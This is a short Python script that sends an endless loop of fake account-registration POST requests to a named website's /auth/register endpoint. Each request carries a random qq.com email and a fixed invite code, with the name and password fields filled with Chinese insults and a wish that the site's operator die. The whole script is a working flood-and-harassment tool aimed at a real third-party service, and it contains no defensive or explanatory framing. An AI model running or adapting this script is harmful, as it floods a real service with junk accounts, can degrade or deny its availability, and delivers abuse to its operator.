import requests
import random
import threading


def send():
    url = 'https://www.chenqiushi.club/auth/register'
    random_num = random.randint(1, 999999999999)
    random_email = "%d@qq.com" % random_num
    data = {
        'email' : random_email,
        'name' : '狗儿子，我是你亲爹',
        'passwd' : '你真是个脑瘫,这几个破B节点就在叫人来永远白嫖了？你这废物是真该死啊，看的老子恶心，就得来恶心你',
        'repasswd': '你真是个脑瘫,这几个破B节点就在叫人来永远白嫖了？你这废物是真该死啊，看的老子恶心，就得来恶心你',
        'wechat' : random_num,
        'imtype' : '2',
        'code' : 'LYTz'
    }

    r = requests.post(url,data)

    print(random_email,r.content)

while(True):
    t1 = threading.Thread(target=send())
    t1.start()





